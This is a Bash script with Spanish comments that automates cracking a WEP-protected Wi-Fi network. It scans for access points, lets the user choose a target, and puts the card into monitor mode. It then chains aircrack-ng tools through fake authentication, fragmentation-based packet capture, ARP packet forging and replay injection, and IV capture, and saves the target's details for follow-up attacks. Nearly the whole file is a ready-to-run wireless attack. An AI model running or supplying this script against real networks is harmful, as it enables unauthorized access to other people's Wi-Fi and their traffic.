DEBUG=1
DEBUG_WIFI=0

function salir () {
	if [ "$IFAC" != "" ]
	then
		wlanconfig $IFAC destroy
	fi
	
	if [ "$IFACTMP" != "" ]
	then
		wlanconfig $IFACTMP create wlandev wifi0 wlanmode sta
		
		ifconfig $IFACTMP up
	fi
	
	exit
}

function scanearaps () {
	# TODO: Saber el tipo de encriptacion
	echo "Escaneando..."
	
	# scaneamos aps
	if [ "$DEBUG_WIFI" == "0" ]
	then
		linea "iwlist $IFACTMP scan > tmpiwl.txt"
	fi

	echo "Formateamos el resultado del scaneo..."
	
	linea 'cat tmpiwl.txt | 
	sed -sn "/Cell 0\|ESSID\|(Channel/p" | 
	sed -e "s/.*Address: \|.*ESSID:\|.*Channel //" -e "s/\"//g" | 
	tr "\n" "|" | 
	sed -e "s/)|/\n/g" > tmpiwlm.txt'
}

R=""
function linea () {
	if [ "$DEBUG" == "1" -a "$1" != "" ] 
	then
		echo "	================================================================"
		echo "	| Traza : Vamos a ejecutar...                                  |"
		echo "	|..............................................................|"
		echo "	  $1"
		echo "	================================================================ "
		echo -n "	Lo Ejecutamos? (S/n) :"
		read res
		echo "	================================================================ "

		
		if [ "$res" == "n" ]
		then
			salir
		fi
	fi
	
	if [ "$1" != "" -a "$2" == "" ] 
	then
		R=""
		R=`sh -c "$1"`
	elif [ "$1" != "" ] 
	then
		sh -c "$1"
	fi

	echo "________________________________________________________________________"
}

function getchannel () {
	linea "egrep $ESSID tmpiwlm.txt | cut -f 3 -d '|'"
	CHANNEL=$R
}

linea
echo "Capturamos la interfaz wifi : "

linea 'iwconfig | grep IEEE | cut -d " " -f 1'
IFACTMP=$R

echo "Interfaz temporal para scaneos : $IFACTMP"
linea 

if [ "$1" == "" ]
then
	echo -n "Quieres buscar un ap? (S/n) : "
	read res
	linea
	
	if [ "$res" != "n" ]
	then
		res=""
		
		while [ "$res" == "" ]
		do
			scanearaps
			linea 'nl -s ")-" tmpiwlm.txt'
			TMPIWL=$R
			
			if [ "$TMPIWL" == "" ]
			then
				echo -en "No se han encontrado aps.\nDesea escanear otra vez? (S/n) : "
				read res
				
				if [ "$res" == "n" ]
				then
					salir
				fi
				linea
			else
				echo "$TMPIWL"
				linea
				echo -en "Escribe el numero del ap a crackear \no dejalo vacio para escanear otra vez : "
				read res
				linea

			fi
		done
		
		linea "nl -s ')-' tmpiwlm.txt | 
		grep ' $res)-' | 
		cut -f 2 -d '|'"
		
		ESSID=$R
	else
		echo -n "Dame el essid del ap a atacar : "
		read res
		linea
		export ESSID="$res"
	fi
else	
	# ESSID del ap a crackear pasado como parametro
	export ESSID="$1"
fi

# Canal del AP a crackear
getchannel

# Si no tenemos channel es que no hemos scaneado
# aun o no encontramos el essid
while [ "$CHANNEL" == "" ]
do
	scanearaps
	getchannel
	
	if [ "$CHANNEL" == "" ]
	then
		echo "No se encuentra el ap $ESSID."
		echo -n "Escaneamos otra vez? (S/n) : "
		read res
		linea
		
		if [ "$res" == "n" ]
		then
			salir
		fi
	fi
done

# MAC del AP a crackear
linea "egrep '$ESSID' tmpiwlm.txt | cut -f 1 -d '|'"
AP=$R

# La interfaz que vamos a usar para crackear
if [ "$DEBUG_WIFI" == "0" ]
then
	echo "Creamos una interfaz en modo monitor"
	linea "airmon-ng start wifi0 $CHANNEL | egrep 'monitor' | cut -f 1"
	IFAC=$R
	
	echo "Capturamos la MAC de la interfaz"
	linea "ifconfig | grep $IFAC | grep HWaddr | sed -e 's/.* HWaddr //g' |cut -c 1-17 | sed -e 's/-/:/g'"
	WIFI=$R
fi


echo "ESSID : $ESSID"
echo "Canal : $CHANNEL"
echo "Mac del ap : $AP"
echo "Mac de la interfaz : $WIFI"
linea

# Destruimos la interfaz de red que no sea mode monitor
# en el resultado del comando anterior lo veremos,
# normalmente es la ath0 la que tenemos que destruir 
# pero debido a mi config de la gos y por un tema relaccionado
# con udev es ath1
if [ "$DEBUG_WIFI" == "0" ]
then
	echo "Destruyendo interfaces no validas"
	linea "wlanconfig $IFACTMP destroy"
fi

mkdir -p "$ESSID"
cd "$ESSID"

# Escribimos la configuracion para posteriores ataques
echo "# Variables" > variables.cfg
echo "# ESSID del ap a crackear" >> variables.cfg
echo "export ESSID=\"$ESSID\"" >> variables.cfg
echo "# channel del ap a crackear" >> variables.cfg
echo "export CHANNEL=$CHANNEL" >> variables.cfg
echo "# Mac address del ap a crackear" >> variables.cfg
echo "export AP=$AP" >> variables.cfg
echo "# La interfaz que vamos a usar para crackear" >> variables.cfg
echo "export IFAC=$IFAC" >> variables.cfg
echo "# Mac address de nuestra tarjeta de red, en el caso de la atheros" >> variables.cfg
echo "# es la mac de la wifi0" >> variables.cfg
echo "export WIFI=$WIFI" >> variables.cfg

echo "Al jaleo..."
linea

# esto no creo que sea necesario, peo ahi queda.
# levantamos la interfaz de modo monitor y la configuramos
# para que este en modo monitor apuntando al canal del ap
# a crackear
linea "ifconfig $IFAC up" "1"
linea "iwconfig $IFAC mode Monitor channel $CHANNEL" "1"

echo "Hacemos una Fake Auth y comprobamos que funciona."
echo "Sino funciona el resto de los pasos tampoco lo haran"
linea "aireplay-ng -1 0 -e $ESSID -a $AP -h $WIFI $IFAC" "1"

echo -n "Buscamos un paquete para inyectar"
echo -n "en este punto necesitamos que haya trafico"
echo -n "real en el ap al que nos vamos a conectar."
echo -n "segun la cantidad de trafico que haya conseguiremos el"
echo -n "paquete antes o despues."
linea "aireplay-ng -5 -b $AP -h $WIFI $IFAC" "1"

echo "Modificamos el paquete anterior para inyectarlo"
linea "packetforge-ng -0 -a $AP -h $WIFI -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w arp-request" "1"

echo "Ahora inyectaremos el paquete en background " 
echo "y nos ponemos a capturar." 
echo "Una vez que tengamos"

linea "xterm -e 'aireplay-ng -2 -r arp-request $IFAC' &" "1"

# nos ponemos a la escucha para capturar las ivs
linea "airodump-ng -c $CHANNEL -bssid $AP --ivs -w cap $IFAC" "1"
# Vamos a otra consola para ejecutar el bs1.sh